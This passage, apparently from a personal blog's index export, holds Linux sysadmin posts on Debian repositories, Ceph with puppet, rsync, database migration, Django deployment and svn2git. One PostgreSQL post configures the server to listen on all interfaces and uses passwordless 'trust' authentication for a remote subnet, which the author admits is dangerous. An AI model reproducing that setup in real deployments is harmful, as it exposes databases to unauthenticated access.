local mirror without Internet connection. reprepro allows me to deploy this everywhere I need to.\nIn the Debian wiki you can find a simple how-to, to build a simple repository that will be then hosted with Apache. I followed the process as explained on the wiki and found it and made a proof of concept. When I was done I could add this repository to the /etc/apt/sources.list.d/ on my test VM.\nThe steps for this a quite simple. On a Debian based system do installed it via apt-get install reprepro or in Archlinux via yaourt reprepro.\nYou then need to have a GPG key that will sign the package. Then you create a folder structurer:\ncd wished/place/to/create mkdir -p ./repos/apt/debian/conf Then you create a distributions files. This contains configuration for the package of what version of different distributions you\u0026rsquo;re going to host with this package. For the moment I\u0026rsquo;ll only support Ubuntu 12.04. Simple for the target system.\nOrigin: Your project name Label: Your project name Codename: \u0026lt;osrelease\u0026gt; Architectures: i386 amd64 Components: main Description: Apt repository for project x SignWith: \u0026lt;key-id\u0026gt; The SignWith is your keyid\nThen you need to create a file for reprepro to get options from. Edit the file ./repos/apt/debian/conf/options with following content:\nverbose basedir /var/www/repos/apt/debian ask-passphrase Now you can create the files for the with the debian package:\nreprepro includedeb precise etherpad-lite_1.4.0-1-gc3a6a23_amd64.deb This will create follwing folders:\nls conf db dists pool When you did follow the way of the debian wiki the current folder would be hosted via apache webserver. This URL will then add to the /etc/apt/sources.list.d/ like this:\ncat /etc/apt/sources.list.d/etherpad-lite.list # etherpad-lite deb http://192.168.200.201 precise main Deploy Let put this together. I\u0026rsquo;ll use nginx for my repository.\nWhen you\u0026rsquo;re using the local reprepro folder you have to deny the access to all other files. Only dists/ and pool/. I create the repository on my local Laptop and then deploy it to a web server.\nThis is my PoC nginx configuration file:\nserver { listen 192.168.200.201:80; access_log /var/log/nginx/packages-access.log; error_log /var/log/nginx/packages-error.log;I location / { root /var/www/reprepro/debian; index index.html; } } What\u0026rsquo;s left is to do, sync the file from reprepro to my test vm.\nrsync -rauvPh dists pool 192.168.56.201:/var/www/reprepro/ I host this package also via apt.akendo.eu/etherpad. I\u0026rsquo;ll create some more package in the further.\nRemarks The current way this packages are build and maintenance is very simple. I don\u0026rsquo;t have that much understanding of what fpm is and is not able to do. Debian packages are very powerful and allow to configure main elements. This package is quite simple and only place a folder with correct permission within the system.\nThere are no dependency marked or anything. This will be more work to do. This works as long you use this package with puppet, but it can not work well without. I have also some thing to do: Remove git folders from the package.\nThis package can be tested via my vagrant project\nUpdate I updated my vagrant environment you can test this etherpad via:\ngit clone git@github.com:Akendo/vagrant-skel.git -b etherpad-lite cd vagrant-skel/ librarian-puppet install vagrant up Have fun.\n","permalink":"https://blog.akendo.eu/post/2014-05-05-fpm-plus-reprepro-equals-awesome/","tags":null,"title":"fpm+reprepro=Awesome"},{"categories":null,"contents":"I was on the 30C3, but this year I wasn\u0026rsquo;t able to find the torrent in a esay way. So I created a small script in python to download this from the.\nYou can download the torrent form the here:\nMP4 Torrent\nwebm Torrent\nI\u0026rsquo;ll update the script later so you can download it on your own. The webm isn\u0026rsquo;t completed duo some connection issue or bug in my script.I have to fix this issue.\nupdate: I fix the issue, the torrents are now completed.\n","permalink":"https://blog.akendo.eu/post/2014-01-04-30c3-torrents/","tags":null,"title":"30C3 Torrents"},{"categories":null,"contents":"\nFor the beauty of a system you can placed your current background for your Kscreensaver instead of the default.\nKDE is by default not able to changes this for the \u0026lsquo;Simple Lock\u0026rsquo;, see in this[1] open bug for more Info.\nBut there is a a small workaround for this[2][3].\nChange into the /usr/share/apps/ksmserver/screenlocker/org.kde.passworddialog/contents/ui/ directory and edit the main.qml with your editor of your choice.\nCreate a backup of this file,\ncp main.qml main.qml.baku then edit on the line 45 and replace:\n- source: theme.wallpaperPathForSize(parent.width, parent.height) + source: \u0026quot;1920x1080.jpg\u0026quot; Now you copy your current background image to \u0026quot;1920x1080.jpg\u0026quot;.\nNote you have to redo this for each update of the package \u0026lsquo;\u0026lsquo;kdebase-workspace\u0026rsquo;\u0026rsquo;.\nLinks:\n[1] https://bugs.kde.org/show_bug.cgi?id=312828\n[2] http://lists.opensuse.org/opensuse-kde/2013-02/msg00082.html\n[3] http://forum.kde.org/viewtopic.php?f=66\u0026amp;t=110039\n[4] https://wiki.archlinux.org/index.php/KDE#Setting_the_screensaver_background_to_the_same_as_the_current_one\n","permalink":"https://blog.akendo.eu/post/2013-09-27-kde4-simple-kscreensaver-using-custom-background-image/","tags":null,"title":"KDE4 - Simple KScreensaver using custom background image"},{"categories":null,"contents":"So I have been busy in the past weeks. I\u0026rsquo;m currently working a lots with OpenStack and Ceph. This Post is about some issue I found inside the puppet-ceph module, further I forked it and solved it. More here osd::devices allow working on dmcrypt block devices.\nLets get start:\nWhen you want to run Ceph, there different ways to handle this. Inktank provide a tool called ceph-deploy. It\u0026rsquo;s in python develop software, but this is no option for environment that has to work automatically. We did run into some bugs and in the next moment the disk were messed up.\nBeside, how do this work when you want to scale. We\u0026rsquo;re using puppet fo this. So we\u0026rsquo;re need some good modules.\nSome days ago the puppet-ceph module was finish. So I started to work with this. The basic module were quite fine, but for our Dtagcloud environment we did need some extra.\nFor this I created, with some help a dmcrypt module.(I\u0026rsquo;ll release it at some point later)\nI did a test with the Vagrant environment. A small trip with vagrant on kvm. Vagrant is great, but in my option the biggest issue is Virtualbox. For a Linux use it\u0026rsquo;s hard to work with it. KVM is more efficient in sense of Virutalzation. It would accelerate the work quite a lot. But I\u0026rsquo;m no ruby guy. To get it running it will take some more, I\u0026rsquo;m looking forward to it!\nBack to puppet-ceph\nThe basic integration works fine. I build up a basic site.pp that include all what I need. I add a second disk and did encrypt it.\nHere kick the issue in.\nError: mkfs.xfs -f -d agcount=1 -l size=1024m -n size=64k /dev/mapper/osd-0 returned 1 instead of one of [0] Error: /Stage[main]/Dtagcloud::Osd/Ceph::Osd::Device[/dev/mapper/osd-0]/Exec[mkfs_OSD-0]/returns: change from notrun to 0 failed: mkfs.xfs -f -d agcount=1 -l size=1024m -n size=64k /dev/mapper/OSD-01 returned 1 instead of one of [0]\nWait what happens here? I look into the Code and saw this:\nexec { \u0026ldquo;mktable_gpt_${devname}\u0026rdquo;: command =\u0026gt; \u0026ldquo;parted -a optimal \u0026ndash;script ${name} mktable gpt\u0026rdquo;, unless =\u0026gt; \u0026ldquo;parted \u0026ndash;script ${name} print|grep -sq \u0026lsquo;Partition Table: gpt\u0026rsquo;\u0026rdquo;, require =\u0026gt; Package[\u0026lsquo;parted\u0026rsquo;] }\nexec { \u0026ldquo;mkpart_${devname}\u0026rdquo;: command =\u0026gt; \u0026ldquo;parted -a optimal -s ${name} mkpart ceph 0% 100%\u0026rdquo;, unless =\u0026gt; \u0026ldquo;parted ${name} print | egrep \u0026lsquo;^ 1.*ceph$\u0026rsquo;\u0026rdquo;, require =\u0026gt; [Package[\u0026lsquo;parted\u0026rsquo;], Exec[\u0026ldquo;mktable_gpt_${devname}\u0026rdquo;]] }\nexec { \u0026ldquo;mkfs_${devname}\u0026rdquo;: command =\u0026gt; \u0026ldquo;mkfs.xfs -f -d agcount=${::processorcount} -l size=1024m -n size=64k ${name}1\u0026rdquo;, unless =\u0026gt; \u0026ldquo;xfs_admin -l ${name}1\u0026rdquo;, require =\u0026gt; [Package[\u0026lsquo;xfsprogs\u0026rsquo;], Exec[\u0026ldquo;mkpart_${devname}\u0026rdquo;]], }\nThat\u0026rsquo;s interesting, first of all that there generating this disk and then assum that the first partition is always called DEVICESn. This isn\u0026rsquo;t working for dmcrypt devices.\nWhy? Simple: We\u0026rsquo;re creating a partition layout on top of a encrypted devices. Sure you could handle this way. The better way would be to create the partition before the encryption.\nBut here a small issue with this: For what? When running with a Ceph OSD, the disk will be all ocopuity. Partition tables are logiscal separtion of disks. There is no need for this here.\nWhen dmcrypt has a partition table with a logical paration on it. The disk will be address as /dev/mapper/OSD-0p1\nThe Code add a 1 to each disk related command.\ndevice =\u0026gt; \u0026ldquo;${name}1\u0026rdquo;,\nThat\u0026rsquo;s bad. For the moment the solution was to commenced the code and keep going. I\u0026rsquo;ll building parameter to allow everyone to handle this by them self.\nBut what\u0026rsquo;s that? Still not working?\nSo the nest issue is here:\nPuppet does convert names internal. What? Wait don\u0026rsquo;t we\u0026rsquo;re in 2013? So lets so more detail about this:\nceph::osd::device { \u0026ldquo;/dev/mapper/OSD-${id}\u0026rdquo;: }\nMy goal was to highlight for Administrator the mounted disk with uppercase. Puppet export this to the facter only lowercase. There is the 1\nhttp://docs.puppetlabs.com/puppet/3/reference/lang_datatypes.html#resource-references\nSummery:\nSources: [clug] Accessing partitions on loop devices\n","permalink":"https://blog.akendo.eu/post/2013-06-24-my-work-with-puppet/","tags":null,"title":"My work with Puppet"},{"categories":null,"contents":"This command allows me to get the md5sum of all files inside of a folder. I did run it on two system with almost the same content inside some folder.\nOn Host A: root@A: find . -type f 2\u0026gt;/dev/null -exec md5sum {} ; \u0026gt;listA.\nOn Host B:\nroot@B: find . -type f 2\u0026gt;/dev/null -exec md5sum {} \\; \u0026gt;listB.txt I get it on my localsystem via scp. Then I run a diff between the both to see where are the differences. the -y makes it look more clear.\ndiff -y listA.txt listB.txt so far\n4k3nd0\nLinks Bash get md5sum of all files in a folder - stackoverflow\n","permalink":"https://blog.akendo.eu/post/2013-05-19-useful-find-cmd/","tags":null,"title":"Useful find cmd"},{"categories":null,"contents":"There is since some days a problem with a pacman. I just saw this post on Google+ Maybe this as an addtional link to the ArchLinux froum\nFor me did a remove of the packages package-query and pacman-color it.\nsudo pacman -Rdd package-query sudo pacman -Rdd pacman-color Update: An upgrade from yaourt to the latest version seem to fix the problem\nso far Akendo\n","permalink":"https://blog.akendo.eu/post/2013-04-07-archlinux-pacman-dead-lock/","tags":null,"title":"[ArchLinux]pacman dead lock"},{"categories":null,"contents":"Status I updated some days ago my blog. I migrated to Octopress, an awesome tool that allows me to write my Blog inside of markdown. My main problem was that Wordpress had become to fat, at some point I started to drop off everything from the server that I didn\u0026rsquo;t need. But still Apache went into \u0026ldquo;out of memory\u0026rdquo; problems. Connections was failing. Duo an outdated kernel version (which i can\u0026rsquo;t control) there is no OOM and at some point I wasn\u0026rsquo;t able to login to the server. The only solution was to reboot.\nTo prevent problem like this i moved to Nginx, but Wordpress don\u0026rsquo;t work to well with this. Apache owns a nice module for PHP, what is missing for the Nginx. The solution here is to run with a fastcgi that will hosted on the localhost. Nginx just forwarding the requests to the fastcgi socket.\nAfter this my web service took lesser memory but the fastcgi had now everything in use. I could save some memory (around 100Mb). Beside that Wordpress needs a MySQL Databases. What doesn\u0026rsquo;t makes me to happy.\nOriginal Django was the Framework of my choice, but duo missing time and skills I wasn\u0026rsquo;t able to make a blog there.\nInstallation For the Server it\u0026rsquo;s quite simple, I\u0026rsquo;m using a the normal webserver.\nThe \u0026ldquo;client\u0026rdquo; where I write and generate the actucaly entrys. I followed the documection from octopress for the setup here.\nNote: There is a bug inside of Gentoo, what will cause the rbenv to start correctly, this will be fix by running: unset RUBYOPT.\nrake generate /home/akendo/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require': cannot load such file -- auto_gem (LoadError) from /home/akendo/.rbenv/versions/1.9.3-p194/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require' Migration For my blog\nWork flow First\nThen I write my entry, to check that the md is looking fine I\u0026rsquo;m checking this on with this online convert\nDeploy Summery The Webserver now only needs 50 Mb of Memeroy, I don\u0026rsquo;t have to use PHP or MySQL and I do save 900 Mb of Memory. Awesome! I\u0026rsquo;m not very use to blogging like this, but it make me happy.\nso far 4k3nd0\n","permalink":"https://blog.akendo.eu/post/2013-04-06-update-of-my-blog-number-3/","tags":null,"title":"Update of My Blog 3"},{"categories":null,"contents":"The Idea I wanted to give back something to the Gentoo Community for doing such a great job. Using Gentoo for some years did makes me happy. So how I can i give something back?\nFor this I\u0026rsquo;ll try to host a mirror of the gentoo emerge portage tree. I just updated the rsyncd service followed this documenation.(Warning its\u0026rsquo; in German) The vps may not fit the requirements, but I give it a try.\nI did send a request to the mirror admin, in the hope there adding my mirror the official list.\nHow to use Adding this GENTOO_MIRRORS=\u0026quot;rsync://gentoo-mirror.akendo.eu/\u0026quot; to my /etc/make.conf then run eix-sync. Here is output:\neix-sync * Copying old database to /var/cache/eix/previous.eix * Running emerge --sync \u0026gt;\u0026gt;\u0026gt; Starting rsync with rsync://88.80.202.107/gentoo-portage... \u0026gt;\u0026gt;\u0026gt; Checking server timestamp ... This is a simple gentoo rsync mirror gentoo-mirror.akendo.eu (88.80.202.107) Serveradmin: 4k3nd0@gmail.com Linux Version 2.6.18-028stab091.2-ent, Compiled #1 SMP Fri Jun 3 01:00:01 MSD 2011 Four 2GHz Intel Pentium Xeon Processors, 2M RAM, 15960 Bogomips Total receiving incremental file list timestamp.chk [.....] Awesome! I added a cronjob that will sync to the main mirror twice a hour. Maybe I add http(s) support someday.\nso far 4k3nd0\n","permalink":"https://blog.akendo.eu/post/2013-04-06-my-gentoo-mirror/","tags":null,"title":"My Gentoo Mirror"},{"categories":null,"contents":"I just updated my blog to use octopress. Later some more.\n","permalink":"https://blog.akendo.eu/post/2013-02-03-update-of-my-blog-number-2/","tags":null,"title":"Update of My Blog 2"},{"categories":null,"contents":"A friend of my helped me out. The problem is the writing scheduler. After i know this I found in a post here, followed by the first link:\rThis approach is great, but the fatal flaw is that it assumes a single, physical disk, attached to a single physical SCSI controller in a single physical host. How does the elevator algorithm know what to do when the disk is actually a RAID array? Does it? Or, what if that one Linux kernel isn’t the only kernel running on a physical host? Does the elevator mechanism still help in virtual environments?\rNo, no it doesn’t. Hypervisors have elevators, too. So do disk arrays. Remember that in virtual environments the hypervisor can’t tell what is happening inside the VM[0]. It’s a black box, and all it sees is the stream of I/O requests that eventually get passed to the hypervisor. It doesn’t know if they got reordered, how they got reordered, or why. It doesn’t know how long the request has been outstanding. As a result it probably won’t make the best decision about handling those requests, adding latency and extra work for the array. Worst case, all that I/O ends up looking very random to the disk array.\rFixing this using the io scheduler of the SCSI HDD/Raid 1. Disabling it via on a live system.\recho noop \u0026gt; /sys/block/queue/scheduler\rEnabling it into the system by editing /etc/grub.conf with option\relevator=noop\r\u0026nbsp;\rSources:http://www.gnutoolbox.com/linux-io-elevator/http://blog.bodhizazen.net/linux/improve-kvm-performance/http://lonesysadmin.net/2008/02/21/elevatornoop/https://www.redhat.com/magazine/008jun05/features/schedulers/ ","permalink":"https://blog.akendo.eu/post/2012-07-05-kvm-io-problems/","tags":["CentOS","Debian","Gentoo","Gernal","Hardware","Kernel","KVM","Linux","System","virtualization"],"title":"KVM and I/O problems"},{"categories":null,"contents":"The first try was using the mysqldump with the option of --compatible=postgresql what is looking quite promossing. But it isn't, some extra work! I found on the https://en.wikibooks.org/wiki/Converting_MySQL_to_PostgreSQL\ra reffert to a gem program. But like ruby gems always, it didn't worked (What do people like about ruby? It seems never to work for me....)\rBut lucky the itnernet is a wide space, so i found this blog post http://onestoryeveryday.com/mysql-to-postgresql-conversionmigration.html the referd perl script was not woring. But it helped me to get the ruby gem to work...\rWhere was the mysql2psql.yml ? Ah... it have to run once the program, then it creates a mysql2psql.yml into the working directory. But here kicks a problem in, you need a mysql connection. So when you have just a dump it's bad.\rIt would mean to install a new mysql db, import the dump and then export it. Else you could save this time and do it directly from the live db.But i had to do it anyway. It's a fine program, that took a bit of time. Thanks for this, but some better shell handling would be welcomed. So far, this are my steps;\rsudo apt-get install mysql-server\rsudo apt-get install ruby-dev rake libmysql++-dev libpq-dev\rsudo gem install mysql2psql\rcd /tmp # Here is where my dump file is stored.\rsudo apt-get install mysql-server\rmysql -u root -p \u003c\u003c EOF\rCREATE DATABASE mail;\rEOF\rmysql -u root -p mail \u003c mail.dump\rmysql2psql # Need to edit the config file\rmysql2psql # This can take a while\rcreatedb -U postgres mail\rpsql -U postgres -d mail \u003c mysql_db_to_pg.dump\rHere an example for the mysql2psql.yml file:\rmysql:\rhostname: localhost\rport: 3306\rsocket: /var/run/mysqld/mysqld.sock\rusername: root\rpassword: apassword\rdatabase: mail\rdestination:\r# if file is given, output goes to file, else postgres\rfile: mysql_db_to_pg.dump\rpostgres:\rhostname: localhost\rport: 5432\rusername: mysql2psql\rpassword:\rdatabase: mysql2psql_test\r# if tables is given, only the listed tables will be converted. leave empty to convert all tables.\r#tables:\r#- table1\r#- table2\r# if exclude_tables is given, exclude the listed tables from the conversion.\r#exclude_tables:\r#- table3\r#- table4\r# if supress_data is true, only the schema definition will be exported/migrated, and not the data\rsupress_data: false\r# if supress_ddl is true, only the data will be exported/imported, and not the schema\rsupress_ddl: false\r# if force_truncate is true, forces a table truncate before table loading\rforce_truncate: false\r\u0026nbsp;\rso far\rAkendo ","permalink":"https://blog.akendo.eu/post/2012-05-19-mysql-postgresql/","tags":["Blog","Console","Debian","gem","Gernal","Jetty","Linux","MySQL","mysql","postgres","PostgreSQL","Postgresql","psql2mysql","Software"],"title":"MySQL to Postgresql"},{"categories":null,"contents":"Related to the previors Post, i hade now to apply from virtualenv to a apache webserver. I used to deployed it with the WSGI.\rFor that you need to enable the mod_wsgi in apache2.\rTo enable it in debian:\rapt-get install libapache2-mod-wsgi\ra2enmod wsgi\rservices apache2 restart\rNow disabling the old mod_python in the configuration files. Add this to the top of your virtualhost file:\rWSGIDaemonProcess $GROUPNAME python-path=/path/to/django/project/.env/lib/python2.6/site-packages user=apache group=apache processes=2 threads=25\rWSGIProcessGroup $GROUPNAME\rWSGIScriptAlias / \"/path/to/django/project/wsgi.py\"\rDocumentroot /path/to/django/project/\rOrder allow,deny\rAllow from all\rThis is it. Some details:\rImportant is to set a WSGIDaemonProcess, it allows to specifically the resource that the WSGI Process can use. Then the $GROUPENAME(Set it as you like to), so when you have more then one WSGI implementation, that the WSGI no interfering each other. There still some more options possible. ","permalink":"https://blog.akendo.eu/post/2012-04-26-deploy-wsgi-virtualenv-django/","tags":["Apache","Debian","Gentoo","Gernal","Linux","Python","Software","virtualenv","Webserver"],"title":"How to deploy wsgi with apache"},{"categories":null,"contents":"virutalenv\rVirutalenv is a python program that allows you to create system separate container with an own version of python/pip. All installed packages(with pip) are store there.\rThis allow a developer to install all necessarily packages into the userspace. It's smoother and allow to have separate version of the same project, for example django.\rStarting command:\rvirtualenv --no-site-packages .env\rTo apply the virtualenv to your local environment run\rsource .env/bin/activate\r(.env)akendo @ akendo :: .../Django\rThat will change you bash environment to use the python/pip version of the virtualenv.\rNow you can install you python packages via pip without interfering with other version in the system.\rAn example for our django project, this the list of need packages, all stored in a \"requirements.txt\" file.\rTo create a requirements.txt, push all the requiert package into the file. You can use the pip freeze command to create file for all installed packages.\rdjango==1.2.7\rdjango-celery\rpsycopg2\rPIL\rBeautifulSoup\rMarkdown\rdjango-tastypie\rdjango-oauth\roauth2\rsimplejson\rWhen you have all, just use the -r option to the pip call:\rpip install -r path/to/requirements.txt\rSources:Setting up Django virtual environment via python ","permalink":"https://blog.akendo.eu/post/2012-03-28-bulding-virtualenv/","tags":["Django","Gernal","pip","Python","Software","virtualenv"],"title":"Bulding a virtualenv"},{"categories":null,"contents":"Remote access to a Postgtres Database\rIn the last days i have worked a lot with PostgreSQL. We have some Django Application which needs some extra SQL love. I have a installation script what insert all the script to the extra SQL into the database. The Problem: \" How to do this on a remote database host, without coping everything to it more often?\"\rA try with psql command show also support for remote host. The great thing about psql is that will automatic using a SSL connection.\rThe command is:\rpsql -h $DATABASE_HOST -d DATABASE -U $ROLE\rTo make this work, i have first enable that the socket, to listing on a different Interface then localhost.\rChange listen address in postgresql.conf\r#------------------------------------------------------------------------------\r# CONNECTIONS AND AUTHENTICATION\r#------------------------------------------------------------------------------\r# - Connection Settings -\rlisten_addresses = '0.0.0.0' # what IP address(es) to listen on;\r# comma-separated list of addresses;\r# defaults to 'localhost', '*' = all\r# (change requires restart)\rport = 5432 # (change requires restart)\rmax_connections = 100 # (change requires restart)\r# Note: Increasing max_connections costs ~400 bytes of shared memory per\r# connection slot, plus lock space (see max_locks_per_transaction).\rAdd your accessing host to the pg_hpa.conf\r# Database administrative login by UNIX sockets\rlocal all postgres trust\r# TYPE DATABASE USER CIDR-ADDRESS METHOD\r# \"local\" is for Unix domain socket connections only\rlocal all all trust\r# IPv4 local connections:\rhost all all 127.0.0.1/32 trust\r# IPv6 local connections:\rhost all all ::1/128 trust\rhost myDB all 172.17.7.2/27 trust\rNow restarting the postgreSQL and i can access via psql from my host.\rpsql -h POSTGRESQL_HOST -U $USER -d myDB\rpsql (8.4.11)\rType \"help\" for help.\rmyDB=#\r\u0026nbsp;\rSecurity note:\rThe \"trust\" is taking every request reguardless who is doing. This IS very DANGEROUS! I did it becourse i'm a lazy admin and don't want to insert everytime a password during deployments. Be aware of Spoofing Attacks!\r","permalink":"https://blog.akendo.eu/post/2012-03-12-enable-remote-access-postgresql/","tags":["bash","Console","Debian","Gentoo","Gernal","Linux","PostgreSQL","Postgresql","psql","remote","Software"],"title":"Enable remote access for PostgreSQL"},{"categories":null,"contents":"Regard this Post, i make this post. First: scp is great. But i recomand to use rsync instead. It has replace for me also the cp and scp command. Why?\rSimple rsync is more powerful. I allows me dry runs, then it's very efficient. File moves should be easy and save. That is what rsync does! It's some tool that need a little bit use.\rrsync is simply for backups, but that is almost the same coping around like the cp/scp.\rSome examples\rStart with a dry run:\rrsync -nv somefile user@server:/path/to/copy\rThis will connect as user to server. Then show what he will copying, That is very useful to check when your running recusive. A / makes a lots of different in the path showing.\rrsync -rnv somefolder user@server:/path/to/copy/\rsomefolder/a\rrsync -rnv somefolder/ user@server:/path/to/copy/\r./a\r\u0026nbsp;\rProblems with scp\rYou have a big file you want to push to your vServer, you don't want fill up all of your bandwidth so you set a set a limit of for bw. Your using scp -l, so we setting a limit of 150 kB/s\rscp -l 150 somefile user@server:/path/to/save\rI got some wired problem with the scp limiter. Sometimes it works, sometimes it didn't. Why?\rThat is the version with rsync\rrsync --bwlimit 150 somefile user@server:/path/to/save\rIt's basically the same, but it worked reliable on rsync.\rBut when the copy process stops before your done (lost connection for example) you have to start over again. . The solution is using inplace option in rsync:\r\u0026nbsp;\rinplace copy:\rrsync is able to copy a file on inplace. This very important you are able to suspend a copy process.\rrsync --inplace somefile user@server:/path/to/save\r(Lost Connection)\rrsync --inplace somefile user@server:/path/to/save\r\u0026nbsp;\rKeeping the rights, scp will copy and place with the default umask of the system user. rsync allow you to keep the right permission with -a option\rls -l somefile\r-rw-r--r-- 1 akendo akendo 347 4. Dez 16:21 somefile\rscp -a somefile user@server:/path/to/save\ruser@server: ls -l somefile\r-rw-r----- 1 user user 347 Mar 7 00:19 somefile\rrsync -a somefile user@server:/path/to/save\ruser@server: ls -l somefile\r-rw-r--r-- 1 akendo akendo 347 4. Dez 16:21 somefile\rAs you can see, lose the User/Groups , Time Stamp will be lost with scp. In rsync this will remain the same.\r\u0026nbsp;\rUsing Humanreadable\rrsync -vh somefile user@server:/path/to/copy\rsomefile\rsent 2.02K bytes received 112 bytes 1.42K bytes/sec\rtotal size is 964.25M speedup is 452912.60 (DRY RUN)\r\u0026nbsp;\rSome nice looking example, to clone a folder:\rrsync -rauvh /file user@server:/path/to/save\rThis will copy the folder \"file\" to \"/path/to/save\" on the host server as user.\rIn some other post i show the best way of using it as a backup method.\rFeel free to add comments or improve this post. \u0026nbsp; ","permalink":"https://blog.akendo.eu/post/2012-03-07-rsync-scp/","tags":["bash","Console","cp","Debian","Gentoo","Gernal","Howto","Linux","scp","System"],"title":"rsync - the better scp"},{"categories":null,"contents":"I'm working with Python Django and PostGIS.\rWhen i try to add the Geo support to the Project, i hit this error message:\rOSError: /usr/local/lib/libgeos_c.so: cannot open shared object file: No such file or directory\rAs I notfied about that he is try to work with the /usr/local/ path what is wrong. I found the lib installed corretly to the /usr/lib/libgeos_c.so . So i simply link it to the /usr/lib/ folder:\rsudo ln -s /usr/lib/libgeos_c.so /usr/local/lib/\rThat does the job.\rMake sure that you have the sci-libs/geos installed. ","permalink":"https://blog.akendo.eu/post/2012-02-24-fix-libgeoscso/","tags":["bash","Django","Gentoo","Gernal","libgeos","Linux","ln","PostGIS","Python","Software"],"title":"Howto fix libgeos_c.so not found"},{"categories":null,"contents":"I'm currently moving our old svn repositories to git. There a lots of reason to do this. Performance, Disk Space, SVN sucks, decentralization and some more.\nHere is a Video from Linux Tolvads talking about Git. Tech Talk: Linus Torvalds on git Tools Used:\rI recommand this svn2git tool! It has a good documentation, easy to understand and work almost out of the box!\r\u0026nbsp;\rSome Words:\rI start looking in my local repository from Gentoo. eix showed git2svn from http://gitorious.org/svn2git/svn2git . There was a problem running it from our SVN Repo. He wan't able to found some URL part. So it was complete useless. I started to google a bit. I found some nice links that explain and have some examples. Our svn contains lots of different repositories, i used this link here as a sample. The Script fits as basic, i adjusted it, so that it fit fine for me. I change it so it can uses SSH to create the Git repositories on a remote Host. Addtional i created a authors file.\rExample:\rstnick = Santa Claus \u0026lt;nicholas@lapland.com\u0026gt;\rCode:\r#!/usr/bin/env bash\rREPOS=\"project1 project2 project3 project4\"\rURL=\"https://10.0.4.7:/Musicpictures\"\rREMOTE_IP=\"10.0.4.5\"\rfor repo in $REPOS\rdo\recho \"Create local repor\"\rmkdir $repo\rcd $repo\recho \"Start of svn2git progress\"\rcmd=\"svn2git $URL/$repo -m --authors ../authors.txt\"\recho $cmd\r`$cmd`\recho \"Prepare remote Host with SSH\"\rssh root@10.0.4.5 \"mkdir -p /var/git/svn2git/$repo.git \u0026amp;\u0026amp; cd /var/git/svn2git/$repo.git \u0026amp;\u0026amp; git init --bar\"\rcmd=\"git remote add origin ssh://root@10.0.4.5/var/git/svn2git/$repo.git\"\recho $cmd\r`$cmd`\rcmd=\"git push --all\"\recho $cmd\r`$cmd`\rcd ..\recho \"DONE EXPORTING $repo\"\rdone\rexit\rAddtional i change the the verbose and also i add -m for the orgirnal SVN Link, this coaint then also the classic comit ID.\nThe Main Problem is that not all of the repo are in the default SVN way store, some has no trunk/tags/branches structures. So i have to check that all has been converted in a right way.\nSources:http://chrisjean.com/2009/02/21/git-project-description-file-hasnt-been-set/ ","permalink":"https://blog.akendo.eu/post/2012-02-18-svn2git/","tags":["Debian","Gentoo","Git","github","gitt","Linux","Software","SVN","svn","svn2git"],"title":"svn2git"},{"categories":null,"contents":"\r\u0026nbsp;\r\u0026nbsp;\rI need some Monitoring for Nagios3 of my MongoDB. I found quick some refer in the MongoDB wiki to this github link. All what you have to do is downloading the Code from github.\rYou need to install pymongo and python-dev, then you can using it. Here my steps:\rwget -c https://github.com/mzupan/nagios-plugin-mongodb/zipball/master\runzip master -d nagios_plugin_mongodb\rrm master\rapt-get install python-dev\rpip install pymongo\rcd nagios_plugin_mongodb/mzupan-nagios-plugin-mongodb-59a9247\rcp check_mongodb.py /usr/lib/nagios/plugins/check_mongodb\r/usr/lib/nagios/plugins/check_mongodb -h localhost -d monogodb_test_db\r/usr/local/lib/python2.6/dist-packages/pymongo/connection.py:378: DeprecationWarning: slave_okay is deprecated. Please use read_preference instead.\r\"use read_preference instead.\", DeprecationWarning)\rOK - Connection took 0 seconds\rYou can ignore the DeprecationWarning from Python.\rSources:http://www.mongodb.org/display/DOCS/Monitoring+and+Diagnosticshttps://github.com/mzupan/nagios-plugin-mongodb ","permalink":"https://blog.akendo.eu/post/2012-02-06-monitor-monogodb-nagios/","tags":["apt-get","Debian","Gernal","github","Howto","Linux","MongoDB","Monitoring","Nagios","Software"],"title":"How to monitor MonogoDB with Nagios"},{"categories":null,"contents":"Currently is there no developer for compiz in Gentoo. That is a problem, it has bug and no one is fix them. So the Gentoo Stuff deciecd to remove them. !!! The following installed packages are masked: - x11-libs/libcompizconfig-0.8.4-r2::gentoo (masked by: package.mask) /usr/portage/profiles/package.mask: # Jorge Manuel B. S. Vicetto \u0026lt;jmbsvicetto@gentoo.org\u0026gt; (22 Jan 2012) # Mask compiz for last-rites unless someone steps up # to maintain it. Removal in 30 days. - x11-wm/compiz-0.8.6-r3::gentoo (masked by: package.mask) - dev-python/compizconfig-python-0.8.4-r3::gentoo (masked by: package.mask) - x11-apps/ccsm-0.8.4-r1::gentoo (masked by: package.mask) - x11-plugins/compiz-plugins-unsupported-0.8.4-r1::gentoo (masked by: package.mask) - x11-wm/compiz-fusion-0.8.6::gentoo (masked by: package.mask) - x11-plugins/compiz-plugins-extra-0.8.6-r1::gentoo (masked by: package.mask) - x11-themes/emerald-themes-0.5.2::gentoo (masked by: package.mask) - x11-libs/compizconfig-backend-gconf-0.8.4-r2::gentoo (masked by: package.mask) - x11-libs/compiz-bcop-0.8.4::gentoo (masked by: package.mask) - x11-wm/emerald-0.8.4-r2::gentoo (masked by: package.mask) - x11-plugins/compiz-plugins-main-0.8.6-r1::gentoo (masked by: package.mask) For more information, see the MASKED PACKAGES section in the emerge man page or refer to the Gentoo Handbook \u0026nbsp; That why i started to move to gnome 3.2, i have try it on my Workstation. Addtional i found some nice extionas that allow me to bring some useable to Gnome 3. 2. But more late, that how i did it. Start with a look on the gnome-base/gnome package, then unmask it. [I] gnome-base/gnome Available versions: (2.0) 2.32.1-r1 ~3.2.1 {accessibility (+)cdr cups dvdr +extras +fallback ldap mono policykit} Installed versions: 2.32.1-r1(2.0)(15:44:58 12/20/11)(cdr cups dvdr ldap policykit -accessibility -mono) Homepage: http://www.gnome.org/ Description: Meta package for GNOME 3, merge this package to install \u0026nbsp; echo \"gnome-base/gnome ~amd64\" \u0026gt;\u0026gt; /etc/portage/package.keywords emerge -DNuvaq world This will enter some error message, i recommand to use the --autounmask-write to save the time by unmasking. This made end in some resolve error. Sometime it's no unmask everything in the right way, make sure you got x11-libs/cairo-1.10.2-r2 unmask, i used x11-libs/cairo-1.10.2-r1 and this caused some trouble. When you done, wait till it's compied. Restart the the Xserver or better the host. \u0026nbsp; After it, i went to https://extensions.gnome.org, here a list of some extensions i recommand: Note you need to use Firefox, Chrome has some bug and will not work 